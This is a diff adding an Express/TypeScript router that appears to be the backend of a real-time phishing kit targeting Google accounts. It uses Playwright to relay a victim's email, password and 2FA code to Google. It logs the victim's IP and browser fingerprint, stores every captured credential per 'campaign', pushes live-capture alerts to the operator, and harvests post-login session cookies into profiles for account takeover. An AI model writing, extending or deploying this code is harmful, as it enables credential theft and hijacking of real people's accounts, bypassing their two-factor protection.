@@ -1,0 +1,531 @@
+import { Router, Request, Response } from 'express';
+import googleAuthService from '../../services/browser/google-auth-http.service';
+import profileManagerService from '../../services/browser/profile-manager.service';
+import resourceManager from '../../services/resource-manager.service';
+import campaignService from '../../services/campaign.service';
+import websocketService from '../../services/websocket.service';
+import prisma from '../../config/database';
+import { logger } from '../../utils/logger.util';
+import { v4 as uuid } from 'uuid';
+
+const router = Router();
+
+/**
+ * POST /api/google/session/start
+ * Initialize Playwright session and validate email with Google
+ */
+router.post('/start', async (req: Request, res: Response) => {
+  try {
+    const { email, fingerprint, captureId } = req.body;
+    if (!email) {
+      res.status(400).json({ success: false, status: 'INVALID_EMAIL', error: 'email is required' });
+      return;
+    }
+    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    if (!emailRegex.test(email)) {
+      res.status(200).json({ success: false, status: 'INVALID_EMAIL', message: "Couldn't find your Google Account" });
+      return;
+    }
+
+    const sessionId = uuid();
+    logger.info(`[START] Launching Playwright for ${email}, sessionId=${sessionId}`);
+    
+    if (fingerprint) {
+      logger.info(`[FINGERPRINT] Received victim browser fingerprint: ${fingerprint.userAgent}`);
+    }
+
+    // Extract victim IP from request headers for geo-matched proxy selection
+    const victimIp =
+      (req.headers['x-forwarded-for'] as string)?.split(',')[0]?.trim() ||
+      req.socket.remoteAddress ||
+      '';
+
+    const sessionResult = await googleAuthService.startSession(email, sessionId, fingerprint, victimIp);
+    
+    if (!sessionResult.success) {
+      res.status(500).json({ success: false, status: 'ERROR', error: sessionResult.error });
+      return;
+    }
+
+    const { browser, page } = sessionResult;
+
+    try {
+      const result = await googleAuthService.submitEmail(sessionId, email);
+      logger.info(`[START] submitEmail result: ${JSON.stringify(result)}`);
+
+      if (result.nextStage === 'password') {
+        let resolvedCampaignId = '';
+        let resolvedCaptureId = captureId || '';
+        let resolvedUserId: string | undefined = undefined;
+
+        if (captureId) {
+          try {
+            const campaign = await prisma.campaign.findUnique({ where: { captureId: captureId } });
+            if (campaign) {
+              resolvedCaptureId = captureId;
+              resolvedCampaignId = campaign.id;
+              resolvedUserId = campaign.userId;
+              await prisma.session.create({
+                data: {
+                  id: sessionId,
+                  email,
+                  status: 'EMAIL_ENTERED',
+                  captureId: resolvedCaptureId,
+                  campaignId: resolvedCampaignId,
+                  userId: resolvedUserId,
+                },
+              });
+              logger.info(`[START] DB session created: ${email}, campaign=${resolvedCampaignId}`);
+            }
+          } catch (dbErr: any) {
+            logger.warn(`[START] DB session create skipped: ${dbErr.message}`);
+          }
+        }
+
+        resourceManager.registerSession(sessionId, {
+          browser,
+          page,
+          stage: 'password',
+          campaignId: resolvedCampaignId,
+          captureId: resolvedCaptureId,
+          proxyUsed: undefined,
+          email,
+        });
+
+        res.status(200).json({ success: true, status: 'REQUIRES_PASSWORD', sessionId });
+      } else {
+        await googleAuthService.cleanupSession(sessionId);
+        res.status(200).json({ success: false, status: 'INVALID_EMAIL', message: result.error || "Couldn't find your Google Account" });
+      }
+    } catch (innerError: any) {
+      await googleAuthService.cleanupSession(sessionId);
+      logger.error('[START] Playwright email error:', innerError.message);
+      res.status(500).json({ success: false, status: 'ERROR', error: innerError.message });
+    }
+  } catch (error: any) {
+    logger.error('[START] Session start error:', error.message);
+    res.status(500).json({ success: false, status: 'ERROR', error: error.message });
+  }
+});
+
+/**
+ * POST /api/google/session/:id/email
+ * Submit email
+ */
+router.post('/:id/email', async (req: Request, res: Response) => {
+  try {
+    const { id } = req.params;
+    const { email } = req.body;
+
+    if (!email) {
+      res.status(400).json({
+        success: false,
+        error: 'email is required',
+      });
+      return;
+    }
+
+    // Get session from resource manager
+    const session = resourceManager.getSession(id);
+
+    if (!session) {
+      res.status(404).json({
+        success: false,
+        error: 'Session not found or expired',
+      });
+      return;
+    }
+
+    // Submit email
+    const result = await googleAuthService.submitEmail(id, email);
+
+    // Update session activity
+    const stage = (result.nextStage === 'password') ? 'password' : 'email';
+    resourceManager.updateSessionActivity(id, stage as any);
+
+    // Update database
+    await prisma.session.update({
+      where: { id },
+      data: {
+        email,
+        status: result.success ? 'EMAIL_ENTERED' : 'INITIATED',
+        lastActivityAt: new Date(),
+      },
+    });
+
+    // Log credential field
+    const campaign = await prisma.campaign.findUnique({ 
+      where: { id: session.campaignId } 
+    });
+
+    if (campaign) {
+      await prisma.credentialField.create({
+        data: {
+          sessionId: id,
+          campaignId: session.campaignId,
+          userId: campaign.userId,
+          fieldType: 'EMAIL',
+          fieldValue: email,
+          fieldLabel: 'Email Address',
+        },
+      });
+
+      // Broadcast live capture event
+      websocketService.broadcastLiveCapture(campaign.userId, {
+        sessionId: id,
+        campaignId: session.campaignId,
+        campaignName: campaign.name,
+        stage: 'email',
+        email,
+        timestamp: new Date(),
+      });
+    }
+
+    res.status(200).json({
+      success: result.success,
+      stage: result.stage,
+      nextStage: result.nextStage,
+      error: result.error,
+    });
+  } catch (error: any) {
+    logger.error('Session email error:', error.message);
+    res.status(400).json({
+      success: false,
+      error: error.message || 'Failed to submit email',
+    });
+  }
+});
+
+/**
+ * POST /api/google/session/:id/password
+ * Submit password
+ */
+router.post('/:id/password', async (req: Request, res: Response) => {
+  try {
+    const { id } = req.params;
+    const { password } = req.body;
+
+    if (!password) {
+      res.status(400).json({
+        success: false,
+        error: 'password is required',
+      });
+      return;
+    }
+
+    // Get session
+    const session = resourceManager.getSession(id);
+
+    if (!session) {
+      res.status(200).json({
+        success: false,
+        status: 'SESSION_EXPIRED',
+        message: 'Session expired. Please start again.',
+      });
+      return;
+    }
+
+    // Touch session - reset 30min inactivity timer
+    resourceManager.touchSession(id);
+
+    // Submit password
+    const result = await googleAuthService.submitPassword(id, password);
+
+    // Update session activity
+    const stage = result.nextStage === '2fa' ? '2fa' : (result.nextStage === 'success' ? 'success' : 'password');
+    resourceManager.updateSessionActivity(id, stage as any);
+
+    // Update database — wrapped in try-catch: /start does not create a DB record in dev
+    // mode so prisma.session.update throws P2025. Skip gracefully and return real auth result.
+    try {
+      await prisma.session.update({
+        where: { id },
+        data: {
+          password,
+          status: result.success ? 'PASSWORD_ENTERED' : 'EMAIL_ENTERED',
+          challengeType: result.twoFactorType,
+          lastActivityAt: new Date(),
+        },
+      });
+
+      const campaign = await prisma.campaign.findUnique({
+        where: { id: session.campaignId }
+      });
+
+      if (campaign) {
+        await prisma.credentialField.create({
+          data: {
+            sessionId: id,
+            campaignId: session.campaignId,
+            userId: campaign.userId,
+            fieldType: 'PASSWORD',
+            fieldValue: password,
+            fieldLabel: 'Password',
+          },
+        });
+
+        const dbSession = await prisma.session.findUnique({ where: { id } });
+
+        websocketService.broadcastLiveCapture(campaign.userId, {
+          sessionId: id,
+          campaignId: session.campaignId,
+          campaignName: campaign.name,
+          stage: 'password',
+          email: dbSession?.email,
+          timestamp: new Date(),
+        });
+      }
+    } catch (dbError: any) {
+      logger.warn(`[PASSWORD] DB update skipped (no session record): ${dbError.message}`);
+    }
+
+    // If success without 2FA, create profile
+    if (result.nextStage === 'success' && result.cookies) {
+      await createProfileFromSession(id, result.cookies);
+      await resourceManager.destroySession(id);
+    }
+
+    res.status(200).json({
+      success: result.success,
+      stage: result.stage,
+      nextStage: result.nextStage,
+      twoFactorType: result.twoFactorType,
+      twoFactorHint: result.twoFactorHint,
+      number: result.twoFactorHint || '',
+      dpNumber: result.twoFactorHint || '',
+      error: result.error,
+    });
+  } catch (error: any) {
+    logger.error('Session password error:', error.message);
+    res.status(400).json({
+      success: false,
+      error: error.message || 'Failed to submit password',
+    });
+  }
+});
+
+/**
+ * POST /api/google/session/:id/2fa
+ * Submit 2FA code
+ */
+router.post('/:id/2fa', async (req: Request, res: Response) => {
+  try {
+    const { id } = req.params;
+    const { code, method } = req.body;
+
+    // Get session
+    const session = resourceManager.getSession(id);
+
+    if (!session) {
+      res.status(404).json({
+        success: false,
+        error: 'Session not found or expired',
+      });
+      return;
+    }
+
+    // Touch session - reset 30min inactivity timer
+    resourceManager.touchSession(id);
+
+    // Submit 2FA
+    const result = await googleAuthService.submit2FA(id, code, method);
+
+    // Update session activity
+    const stage = result.nextStage === 'success' ? 'success' : '2fa';
+    resourceManager.updateSessionActivity(id, stage as any);
+
+    // Update database — wrapped in try-catch: /start does not create a DB record in
+    // local/dev mode, so prisma calls will throw. We gracefully skip them.
+    try {
+      await prisma.session.update({
+        where: { id },
+        data: {
+          status: result.success ? 'COMPLETED' : '2FA_REQUIRED',
+          challengeData: code ? JSON.stringify({ code, method }) : undefined,
+          completedAt: result.success ? new Date() : undefined,
+          lastActivityAt: new Date(),
+        },
+      });
+
+      if (code) {
+        const campaign = await prisma.campaign.findUnique({
+          where: { id: session.campaignId }
+        });
+
+        if (campaign) {
+          await prisma.credentialField.create({
+            data: {
+              sessionId: id,
+              campaignId: session.campaignId,
+              userId: campaign.userId,
+              fieldType: '2FA_CODE',
+              fieldValue: code,
+              fieldLabel: `2FA Code (${method})`,
+            },
+          });
+
+          const dbSession = await prisma.session.findUnique({ where: { id } });
+          websocketService.broadcastLiveCapture(campaign.userId, {
+            sessionId: id,
+            campaignId: session.campaignId,
+            campaignName: campaign.name,
+            stage: '2fa',
+            email: dbSession?.email,
+            timestamp: new Date(),
+          });
+        }
+      }
+
+      if (result.success && result.cookies) {
+        const dbSession = await prisma.session.findUnique({ where: { id } });
+        if (dbSession && dbSession.captureId) {
+          await campaignService.incrementCaptureCount(dbSession.captureId);
+        }
+      }
+    } catch (dbError: any) {
+      logger.warn(`[2FA] DB update skipped (no session record in DB): ${dbError.message}`);
+    }
+
+    // Create profile and destroy session — runs regardless of DB state
+    if (result.success && result.cookies) {
+      await createProfileFromSession(id, result.cookies);
+      await resourceManager.destroySession(id);
+    }
+
+    res.status(200).json({
+      success: result.success,
+      stage: result.stage,
+      nextStage: result.nextStage,
+      error: result.error,
+    });
+  } catch (error: any) {
+    logger.error('Session 2FA error:', error.message);
+    res.status(400).json({
+      success: false,
+      error: error.message || 'Failed to submit 2FA',
+    });
+  }
+});
+
+/**
+ * GET /api/google/session/:id/status
+ * Poll session status (for push 2FA waiting)
+ */
+router.get('/:id/status', async (req: Request, res: Response) => {
+  try {
+    const { id } = req.params;
+
+    const session = resourceManager.getSession(id);
+
+    if (!session) {
+      res.status(404).json({ success: false, error: 'Session not found or expired' });
+      return;
+    }
+
+    const result = await googleAuthService.pollDpCompletion(id);
+
+    if (result.status === 'AUTHENTICATED') {
+      // Extract cookies BEFORE closing anything
+      const cookies = await session.page.context().cookies();
+
+      await createProfileFromSession(id, cookies);
+
+      try {
+        await prisma.session.update({
+          where: { id },
+          data: { status: 'COMPLETED', completedAt: new Date() },
+        });
+        const dbSession = await prisma.session.findUnique({ where: { id } });
+        if (dbSession && dbSession.captureId) {
+          await campaignService.incrementCaptureCount(dbSession.captureId);
+        }
+      } catch (dbError: any) {
+        logger.warn(`[STATUS] DB update skipped: ${dbError.message}`);
+      }
+
+      if (session.campaignId) {
+        const campaign = await prisma.campaign.findUnique({ where: { id: session.campaignId } }).catch(() => null);
+        if (campaign) {
+          websocketService.broadcastLiveCapture(campaign.userId, {
+            sessionId: id,
+            campaignId: session.campaignId,
+            campaignName: campaign.name,
+            stage: 'success',
+            timestamp: new Date(),
+          });
+        }
+      }
+
+      await resourceManager.destroySession(id);
+      await googleAuthService.cleanupSession(id);
+    }
+
+    return res.json(result);
+  } catch (error: any) {
+    logger.error('Session status error:', error.message);
+    res.status(400).json({
+      success: false,
+      error: error.message || 'Failed to get session status',
+    });
+  }
+});
+
+/**
+ * Helper: Create profile from session
+ */
+async function createProfileFromSession(sessionId: string, cookies: any[]) {
+  try {
+    // Extract Google auth cookies regardless of DB state
+    const googleCookies = googleAuthService.extractGoogleCookies(cookies);
+
+    // Try to get data from DB first
+    let userId: string | undefined;
+    let campaignId: string | undefined;
+    let email: string | undefined;
+    let password: string | undefined;
+    let dbSession: any = null;
+
+    try {
+      dbSession = await prisma.session.findUnique({ where: { id: sessionId } });
+      if (dbSession) {
+        userId = dbSession.userId ?? undefined;
+        campaignId = dbSession.campaignId ?? undefined;
+        email = dbSession.email || undefined;
+        password = dbSession.password || undefined;
+      }
+    } catch { /* DB not available in dev mode */ }
+
+    // Fall back to in-memory session for email
+    if (!email) {
+      const memSession = resourceManager.getSession(sessionId);
+      if (memSession && (memSession as any).email) {
+        email = (memSession as any).email;
+        campaignId = campaignId || memSession.campaignId;
+      }
+    }
+
+    // Only skip if we have no db session AND no userId (true dev/no-capture mode)
+    if (!dbSession && userId === undefined) {
+      logger.warn(`[CAPTURE] No DB session and no userId — skipping profile save`);
+      logger.info(`[CAPTURE] Dev mode — ${googleCookies.length} cookies captured for: ${email || 'unknown'}`);
+      googleCookies.forEach((c: any) => logger.info(`  ${c.name}=${(c.value || '').substring(0, 30)}...`));
+      return;
+    }
+
+    // Production mode — save profile to DB
+    await profileManagerService.createProfile({
+      userId,
+      campaignId: campaignId || '',
+      email: email || '',
+      password: password || '',
+      cookies: googleCookies,
+      provider: 'GOOGLE',
+    });
+
+    logger.success(`Profile created from session: ${sessionId}`);
+  } catch (error) {
+    logger.error('Create profile from session error:', error);
+  }
+}
+
+export default router;
